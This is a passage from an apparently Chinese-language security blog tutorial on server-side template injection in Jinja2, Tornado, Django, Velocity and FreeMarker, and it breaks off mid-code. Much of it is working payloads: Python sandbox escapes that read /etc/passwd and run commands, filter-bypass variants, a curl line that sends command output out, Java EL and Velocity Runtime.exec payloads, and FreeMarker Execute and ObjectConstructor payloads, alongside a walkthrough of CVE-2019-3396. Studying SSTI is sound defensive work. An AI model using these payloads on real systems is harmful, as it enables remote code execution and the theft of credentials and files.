<span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> search <span class="keyword">in</span> i.__init__.__globals__.keys():<span class="comment">#对存放该函数中全局变量的字典的引用 — 函数所属模块的全局命名空间。故可以直接调用</span></span><br><span class="line">            print(i, num)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span> </span><br></pre></td></tr></table></figure><p>这时候就要推<code>荐__builtins__</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line">search = <span class="string">&#x27;__builtins__&#x27;</span></span><br><span class="line">num = <span class="number">-1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        print(i.__init__.__globals__.keys())</span><br><span class="line">        <span class="keyword">if</span> search <span class="keyword">in</span> i.__init__.__globals__.keys():</span><br><span class="line">            print(i, num)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>python3:().<code>__class__.__bases__[0].__subclasses__()[64].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;)</code></p><p>python2:<code>().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;)</code></p><p>附上大佬的payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">获得基类</span><br><span class="line">#python2.7</span><br><span class="line">&#39;&#39;.__class__.__mro__[2]</span><br><span class="line">&#123;&#125;.__class__.__bases__[0]</span><br><span class="line">().__class__.__bases__[0]</span><br><span class="line">[].__class__.__bases__[0]</span><br><span class="line">request.__class__.__mro__[1]</span><br><span class="line">#python3.7</span><br><span class="line">&#39;&#39;.__。。。class__.__mro__[1]</span><br><span class="line">&#123;&#125;.__class__.__bases__[0]</span><br><span class="line">().__class__.__bases__[0]</span><br><span class="line">[].__class__.__bases__[0]</span><br><span class="line">request.__class__.__mro__[1]</span><br><span class="line"></span><br><span class="line">#python 2.7</span><br><span class="line">#文件操作</span><br><span class="line">#找到file类</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[40]</span><br><span class="line">#读文件</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read()</span><br><span class="line">#写文件</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[40](&#39;&#x2F;tmp&#39;).write(&#39;test&#39;)</span><br><span class="line"></span><br><span class="line">#命令执行</span><br><span class="line">#os执行</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache下有os类，可以直接执行命令：</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#39;id&#39;).read()</span><br><span class="line">#eval,impoer等全局函数</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__下有eval，__import__等的全局函数，可以利用此来执行命令：</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.eval(&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;id&#39;).read()</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).popen(&#39;id&#39;).read()</span><br><span class="line"></span><br><span class="line">#python3.7</span><br><span class="line">#命令执行</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">#文件操作</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;filename&#39;, &#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">#windows下的os命令</span><br><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[118].__init__.__globals__[&#39;popen&#39;](&#39;dir&#39;).read()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>绕waf</strong></p><p>过滤【</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#getitem、pop</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">40</span>)(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">59</span>).__init__.func_globals.linecache.os.popen(<span class="string">&#x27;ls&#x27;</span>).read()</span><br></pre></td></tr></table></figure><p>过滤引号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#chr函数</span><br><span class="line">&#123;% set chr&#x3D;().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;</span><br><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read()&#125;&#125;#request对象</span><br><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() &#125;&#125;&amp;path&#x3D;&#x2F;etc&#x2F;passwd</span><br><span class="line">#命令执行</span><br><span class="line">&#123;% set chr&#x3D;().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;</span><br><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(chr(105)%2bchr(100)).read() &#125;&#125;</span><br><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(request.args.cmd).read() &#125;&#125;&amp;cmd&#x3D;id</span><br></pre></td></tr></table></figure><p>过滤下划线</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#39;&#39;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read() &#125;&#125;&amp;class&#x3D;__class__&amp;mro&#x3D;__mro__&amp;subclasses&#x3D;__subclasses__</span><br></pre></td></tr></table></figure><p>过滤花括号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#用&#123;%%&#125;标记</span><br><span class="line">&#123;% if &#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#39;curl http:&#x2F;&#x2F;127.0.0.1:7999&#x2F;?i&#x3D;&#96;whoami&#96;&#39;).read()&#x3D;&#x3D;&#39;p&#39; %&#125;1&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><p>利用示例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ &#x3D;&#x3D; &#39;catch_warnings&#39; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% if b.__class__ &#x3D;&#x3D; &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% if &#39;eval&#39; in b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#39;) &#125;&#125;         &#x2F;&#x2F;popen的参数就是要执行的命令</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>3.Tornado</p><p>我觉得除了直接阅读官方的文档，还有一个重要的方法就是直接下载 tornado 的框架源码，全局搜索 <code>需要的值</code>我特地看一下模板的对框架的语法支持(因为，<code>模板中有一些内置的对象等同于框架中的对象，但是一般为了方便书写前段就会给一个比较简单的名字</code>，就比如 JSP 的 request 内置对象实际上对应着 servlet 中的 HttpServletRequest )</p><p>护网杯的easytornado，全局搜索sercet-key，然后再查看官方文档</p><p>4.Django</p><p>很明显 email 就是注入点，但是条件被限制的很死，很难执行命令，现在拿到的只有有一个和user有关的变量request.user ，这个时候我们就应该在<strong>没有应用源码的情况下去寻找框架本身的属性</strong>，看这个空框架有什么属性和类之间的引用。</p><p>后来发现Django自带的应用 “admin”（也就是Django自带的后台）的models.py中导入了当前网站的配置文件：</p><p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911002243408-1781833415.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911002243408-1781833415.png" alt="img"></a></p><p>所以可以通过某种方式，找到Django默认应用admin的model，再通过这个model获取settings对象，进而获取数据库账号密码、Web加密密钥等信息。</p><h4 id="2-利用模语言本身的特性进行攻击"><a href="#2-利用模语言本身的特性进行攻击" class="headerlink" title="2.利用模语言本身的特性进行攻击"></a><strong>2.利用模语言本身的特性进行攻击</strong></h4><h5 id="1-Python"><a href="#1-Python" class="headerlink" title="1.Python"></a><strong>1.Python</strong></h5><p>Python 最最经典的就是使用魔法方法，这里就涉及到Python沙盒绕过了，前面说过，模板的设计者也发现了模板的执行命令的特性，于是就给模本增加了一种沙盒的机制，在这个沙盒中你很难执行一般我们能想到函数，基本都被禁用了，所以我们不得不使用自省的机制来绕过沙盒，具体的方法就是在大佬的[一篇博文](<a href="http://www.k0rz3n.com/2018/05/04/Python">http://www.k0rz3n.com/2018/05/04/Python</a> 沙盒逃逸备忘/)中</p><h5 id="2-JAVA《转载大佬的部分》"><a href="#2-JAVA《转载大佬的部分》" class="headerlink" title="2.JAVA《转载大佬的部分》"></a><strong>2.JAVA</strong>《转载大佬的部分》</h5><p>java.lang包是java语言的核心，它提供了java中的基础类。包括基本Object类、Class类、String类、基本类型的包装类、基本的数学类等等最基本的</p><p><strong>如下图所示：</strong></p><p><a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/java.lang.png"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/java.lang.png" alt="此处输入图片的描述"></a>此处输入图片的描述</p><p>有了这个基础我们就能想到这样的payload</p><p><strong>payload：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;T(java.lang.System).getenv()&#125;</span><br><span class="line"></span><br><span class="line">$&#123;T(java.lang.Runtime).getRuntime().exec(<span class="string">&#x27;cat etc/passwd&#x27;</span>)&#125;</span><br></pre></td></tr></table></figure><p>这里面的 T() 是 EL 的语法规定（比如 Spring 框架的 EL 就是 SPEL)</p><h2 id="java常见的引擎：FreeMarker，-velocity"><a href="#java常见的引擎：FreeMarker，-velocity" class="headerlink" title="java常见的引擎：FreeMarker， velocity"></a>java常见的引擎：FreeMarker， velocity</h2><h3 id="velocity"><a href="#velocity" class="headerlink" title="velocity"></a>velocity</h3><p>（以下板块参照自《<a href="https://xz.aliyun.com/t/8135#toc-2">CVE-2019-3396 Confluence Velocity SSTI漏洞浅析</a>》）</p><p>Apache Velocity是一个基于Java的模板引擎，它提供了一个模板语言去引用由Java代码定义的对象。Velocity是Apache基金会旗下的一个开源软件项目，旨在确保Web应用程序在表示层和业务逻辑层之间的隔离（即MVC设计模式）。</p><p><strong>基本语法</strong></p><p><strong>语句标识符</strong></p><p>#用来标识Velocity的脚本语句，包括#set、#if 、#else、#end、#foreach、#end、#include、#parse、#macro等语句。</p><p><strong>变量</strong></p><p>$用来标识一个变量，比如模板文件中为Hello $a，可以获取通过上下文传递的$a</p><p><strong>声明</strong></p><p>set用于声明Velocity脚本变量，变量可以在脚本中声明</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#set($a &#x3D;&quot;velocity&quot;)</span><br><span class="line">#set($b&#x3D;1)</span><br><span class="line">#set($arrayName&#x3D;[&quot;1&quot;,&quot;2&quot;])</span><br></pre></td></tr></table></figure><p><strong>注释</strong></p><p>单行注释为##，多行注释为成对出现的#* …………. *#</p><p><strong>条件语句</strong></p><p>以if/else为例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#if($foo&lt;10)</span><br><span class="line">    &lt;strong&gt;1&lt;&#x2F;strong&gt;</span><br><span class="line">#elseif($foo&#x3D;&#x3D;10)</span><br><span class="line">    &lt;strong&gt;2&lt;&#x2F;strong&gt;</span><br><span class="line">#elseif($bar&#x3D;&#x3D;6)</span><br><span class="line">    &lt;strong&gt;3&lt;&#x2F;strong&gt;</span><br><span class="line">#else</span><br><span class="line">    &lt;strong&gt;4&lt;&#x2F;strong&gt;</span><br><span class="line">#end</span><br></pre></td></tr></table></figure><p><strong>转义字符</strong></p><p>如果$a已经被定义，但是又需要原样输出$a，可以试用\转义作为关键的$</p><p><strong>基础使用</strong></p><p>使用Velocity主要流程为：</p><ul><li>初始化Velocity模板引擎，包括模板路径、加载类型等</li><li>创建用于存储预传递到模板文件的数据的上下文</li><li>选择具体的模板文件，传递数据完成渲染</li></ul><p>VelocityTest.java</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">package Velocity;</span><br><span class="line"></span><br><span class="line">import org.apache.velocity.Template;</span><br><span class="line">import org.apache.velocity.VelocityContext;</span><br><span class="line">import org.apache.velocity.app.VelocityEngine;</span><br><span class="line"></span><br><span class="line">import java.io.StringWriter;</span><br><span class="line"></span><br><span class="line">public class VelocityTest &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line"></span><br><span class="line">        VelocityEngine velocityEngine &#x3D; new VelocityEngine();</span><br><span class="line">        velocityEngine.setProperty(VelocityEngine.RESOURCE_LOADER, &quot;file&quot;);</span><br><span class="line">        velocityEngine.setProperty(VelocityEngine.FILE_RESOURCE_LOADER_PATH, &quot;src&#x2F;main&#x2F;resources&quot;);</span><br><span class="line">        velocityEngine.init();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        VelocityContext context &#x3D; new VelocityContext();</span><br><span class="line">        context.put(&quot;name&quot;, &quot;Rai4over&quot;);</span><br><span class="line">        context.put(&quot;project&quot;, &quot;Velocity&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Template template &#x3D; velocityEngine.getTemplate(&quot;test.vm&quot;);</span><br><span class="line">        StringWriter sw &#x3D; new StringWriter();</span><br><span class="line">        template.merge(context, sw);</span><br><span class="line">        System.out.println(&quot;final output:&quot; + sw);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>模板文件：src/main/resources/test.vm</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Hello World! The first velocity demo.</span><br><span class="line">Name is $name.</span><br><span class="line">Project is $project</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">final output:</span><br><span class="line">Hello World! The first velocity demo.</span><br><span class="line">Name is Victor Zhang.</span><br><span class="line">Project is Velocity</span><br><span class="line">java.lang.UNIXProcess@12f40c25</span><br></pre></td></tr></table></figure><p>通过 VelocityEngine 创建模板引擎，接着 velocityEngine.setProperty 设置模板路径 src/main/resources、加载器类型为file，最后通过 velocityEngine.init() 完成引擎初始化。</p><p>通过 VelocityContext() 创建上下文变量，通过put添加模板中使用的变量到上下文。</p><p>通过 getTemplate 选择路径中具体的模板文件test.vm，创建 StringWriter 对象存储渲染结果，然后将上下文变量传入 template.merge 进行渲染。</p><p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200907173719066-1030164230.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200907173719066-1030164230.png" alt="img"></a></p><p>这里使用java-sec-code里面的SSTI代码：</p><p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200907191011269-128540012.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200907191011269-128540012.png" alt="img"></a></p><p>poc：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;ssti&#x2F;velocity?template&#x3D;%23set(%24e&#x3D;%22e%22);%24e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22calc%22)$class.inspect(&quot;java.lang.Runtime&quot;).type.getRuntime().exec(&quot;sleep 5&quot;).waitFor() &#x2F;&#x2F;延迟了5秒</span><br></pre></td></tr></table></figure><p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200907192034956-1485346370.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200907192034956-1485346370.png" alt="img"></a></p><p>参照《<a href="https://xz.aliyun.com/t/7466">白头搔更短，SSTI惹人心！</a>》简单进行调试</p><p>在最初的Controller层下断点，来追踪poc的解析过程：</p><p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908095030110-571936567.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908095030110-571936567.png" alt="img"></a></p><p>（template -&gt; instring）进入 Velocity.evaluate 方法：</p><p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908112550988-1581803954.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908112550988-1581803954.png" alt="img"></a></p><p>（instring -&gt; reader）继续跟进 evaluate 方法，RuntimeInstance类中封装了evaluate方法，instring被强制转化(Reader)类型。</p><p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908112728222-13161049.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908112728222-13161049.png" alt="img"></a></p><p>跟进 StringReader 方法查看详情：<br><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908113941507-617770245.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908113941507-617770245.png" alt="img"></a></p><p>（reader -&gt; nodeTree）继续跟进 this.evaluate() 方法</p><p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908115525966-63941808.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908115525966-63941808.png" alt="img"></a></p><p>（nodeTree -&gt; writer）继续跟进render方法</p><p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908141827072-400777989.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908141827072-400777989.png" alt="img"></a></p><p>emmm…继续跟进render</p><p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908142340601-1472158535.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908142340601-1472158535.png" alt="img"></a></p><p>继续看render方法</p><p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908143916739-984676483.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908143916739-984676483.png" alt="img"></a></p><p>跟进execute方法</p><p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908144606960-964942274.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908144606960-964942274.png" alt="img"></a></p><p>可以看到这是最后一步了，调试结束就可以看到poc已经成功被执行，看一下上图中的for循环的代码，大概意思是当遍历的节点时候，这时候就会一步步的保存我们的payload最终导致RCE</p><p><strong>Confluence 未授权RCE分析（CVE-2019-3396）</strong></p><p>根据官方文档的描述，可以看到这是由 widget Connector 这个插件造成的SSTI，利用SSTI而造成的RCE。在经过diff后，可以确定触发漏洞的关键点在于对post包中的_template字段</p><p>具体漏洞代码调试可以参考：《<a href="https://caiqiqi.github.io/2019/11/03/Confluence%E6%9C%AA%E6%8E%88%E6%9D%83%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2019-3396/">Confluence未授权模板注入/代码执行(CVE-2019-3396)</a>》</p><p>　　　　　　　　　　　　　《[Confluence 未授权RCE分析（CVE-2019-3396）](<a href="https://lucifaer.com/2019/04/16/Confluence">https://lucifaer.com/2019/04/16/Confluence</a> 未授权RCE分析（CVE-2019-3396）/#0x01-漏洞概述)》</p><p><strong><em>4\</em></strong>|<strong><em>2**</em></strong>FreeMarker**</p><p>FreeMarker 是一款模板引擎：即一种基于模板和要改变的数据， 并用来生成输出文本(HTML网页，电子邮件，配置文件，源代码等)的通用工具。 它不是面向最终用户的，而是一个Java类库，是一款程序员可以嵌入他们所开发产品的组件。</p><p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200909230452926-1382441572.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200909230452926-1382441572.png" alt="img"></a></p><p><strong>FreeMarker模板代码</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;title&gt;Welcome!&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;　&lt;#–这是注释–&gt;</span><br><span class="line">  &lt;h1&gt;Welcome $&#123;user&#125;!&lt;&#x2F;h1&gt;</span><br><span class="line">  &lt;p&gt;Our latest product:</span><br><span class="line">  &lt;a href&#x3D;&quot;$&#123;latestProduct.url&#125;&quot;&gt;$&#123;latestProduct.name&#125;&lt;&#x2F;a&gt;!</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>模板文件存放在Web服务器上，就像通常存放静态HTML页面那样。当有人来访问这个页面， FreeMarker将会介入执行，然后动态转换模板，用最新的数据内容替换模板中 ${…} 的部分， 之后将结果发送到访问者的Web浏览器中。</p><p>这个模板主要用于 java ，用户可以通过实现 TemplateModel 来用 new 创建任意 Java 对象</p><p>具体的高级内置函数定义参考《<a href="https://freemarker.apache.org/docs/ref_builtins_expert.html">Seldom used and expert built-ins</a>》</p><p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911000148374-491461162.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911000148374-491461162.png" alt="img"></a></p><p>主要的用法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;＃ - 创建一个用户定义的指令，调用类的参数构造函数 - &gt;</span><br><span class="line">&lt;#assign word_wrapp &#x3D;&quot;com.acmee.freemarker.WordWrapperDirective&quot;?new（）&gt;</span><br><span class="line">&lt;＃ - 创建一个用户定义的指令，用一个数字参数调用构造函数 - &gt;</span><br><span class="line">&lt;#assign word_wrapp_narrow &#x3D;&quot;com.acmee.freemarker.WordWrapperDirective&quot;?new（40）&gt;</span><br></pre></td></tr></table></figure><p>调用了构造函数创建了一个对象，那么这个 payload 中就是调用的 freemarker 的内置执行命令的对象 Execute</p><p>freemarker.template.utility 里面有个Execute类，这个类会执行它的参数，因此我们可以利用new函数新建一个Execute类，传输我们要执行的命令作为参数，从而构造远程命令执行漏洞。构造payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign value&#x3D;&quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123;value(&quot;calc.exe&quot;)&#125;</span><br></pre></td></tr></table></figure><p>freemarker.template.utility 里面有个ObjectConstructor类，如下图所示，这个类会把它的参数作为名称，构造了一个实例化对象。因此我们可以构造一个可执行命令的对象，从而构造远程命令执行漏洞。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign value&#x3D;&quot;freemarker.template.utility.ObjectConstructor&quot;?new()&gt;$&#123;value(&quot;java.lang.ProcessBuilder&quot;,&quot;calc.exe&quot;).start()</span><br></pre></td></tr></table></figure><p>freemarker.template.utility 里面的JythonRuntime，可以通过自定义标签的方式，执行Python命令，从而构造远程命令执行漏洞。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign value&#x3D;&quot;freemarker.template.utility.JythonRuntime&quot;?new()&gt;&lt;@value&gt;import os;os.system(&quot;calc.exe&quot;)&lt;&#x2F;@value&gt;</span><br></pre></td></tr></table></figure><p>这里使用测试代码来大概演示一下：<a href="https://github.com/hellokoding/springboot-freemarker">https://github.com/hellokoding/springboot-freemarker</a></p><p>代码演示说明：<a href="https://hellokoding.com/spring-boot/freemarker/">https://hellokoding.com/spring-boot/freemarker/</a></p><p>前端代码　　——&gt;　　hello.ftl</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html 